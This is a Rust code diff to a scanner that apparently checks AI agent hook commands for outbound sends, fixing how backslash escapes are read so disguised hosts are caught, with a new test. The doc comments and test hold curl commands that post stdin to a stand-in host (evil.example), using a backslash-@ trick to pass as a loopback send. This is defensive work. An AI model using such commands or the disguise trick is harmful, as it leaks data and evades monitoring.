@@ -177,13 +177,38 @@ fn shell_segments(cmd: &str) -> Vec<(usize, usize, bool)> {
     out
 }
 
-/// A segment's words with shell quotes removed (whitespace inside quotes kept).
+/// A segment's words as the shell hands them to the program: quotes removed (whitespace
+/// inside quotes kept) and backslash escapes applied by POSIX sh rules, the word rules
+/// the redactor's splitter follows (`spans_of`, b44ed97). Outside quotes `\c` is `c` and
+/// a backslash-newline disappears; inside double quotes only `\$`, `` \` ``, `\"`, `\\`
+/// and backslash-newline are escapes; inside single quotes a backslash is literal. So
+/// `curl https://evil.example\@registry.example` sends to `registry.example`, the host
+/// curl is given, while a URL in a JSON, TOML or `.env` VALUE (never shell-processed)
+/// keeps the WHATWG reading of [`crate::scanners::split_url_authority`].
 fn shell_words(seg: &str) -> Vec<String> {
     let mut words = Vec::new();
     let mut cur = String::new();
     let mut quote: Option<char> = None;
     let mut any = false;
-    for c in seg.chars() {
+    let mut chars = seg.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '\\' && quote != Some('\'') {
+            match (quote, chars.peek().copied()) {
+                (_, Some('\n')) => {
+                    chars.next();
+                }
+                (None, Some(n)) => {
+                    chars.next();
+                    cur.push(n);
+                }
+                (Some(_), Some(n)) if matches!(n, '$' | '`' | '"' | '\\') => {
+                    chars.next();
+                    cur.push(n);
+                }
+                _ => cur.push(c),
+            }
+            continue;
+        }
         match quote {
             Some(q) if c == q => quote = None,
             Some(_) => cur.push(c),
@@ -2477,6 +2502,33 @@ mod tests {
         ] {
             assert_eq!(event_push_host(cmd), None, "{cmd}");
         }
+    }
+
+    /// Command TEXT is read as the shell hands it to curl: `\@` is `@` after the shell, so
+    /// a "loopback" send written `http://127.0.0.1\@evil.example/` goes to evil.example
+    /// and is not one. A URL VALUE in an http hook's JSON is never shell-processed and
+    /// keeps the WHATWG reading (a backslash ends the authority). On 71b57ef
+    /// `shell_words` kept the backslash, the host read as 127.0.0.1 and the send was
+    /// blanked out of the pattern scan (`loopback_send` true). `event_push_host` already
+    /// refuses any command with a backslash, before and after.
+    #[test]
+    fn command_text_urls_are_read_after_shell_unescaping() {
+        assert_eq!(
+            event_push_host(r"jq -r .message | curl -s -d @- https://ntfy.sh\@hooks.example.org/t"),
+            None
+        );
+        let words = shell_words(r"curl -s -d @- http://127.0.0.1\@evil.example/x");
+        assert_eq!(words[4], "http://127.0.0.1@evil.example/x");
+        assert!(!loopback_send(&words, 0));
+        assert!(loopback_send(&shell_words("curl -s -d @- http://127.0.0.1:8080/x"), 0));
+        // Quoting rules: single quotes keep a backslash, double quotes only escape $ ` " \.
+        assert_eq!(
+            shell_words(r#"a\ b 'c\@d' "e\@f" "g\"h" i\\j"#),
+            vec!["a b", r"c\@d", r"e\@f", "g\"h", r"i\j"]
+        );
+        // A config VALUE: WHATWG, the backslash ends the authority.
+        let h = http_hook("Stop", None, r"https://ntfy.sh\@hooks.example.org/t", Dialect::Claude).unwrap();
+        assert_eq!(h.url_host.as_deref(), Some("ntfy.sh"));
     }
 
     /// An http hook is first-party only to the running agent's own vendor.
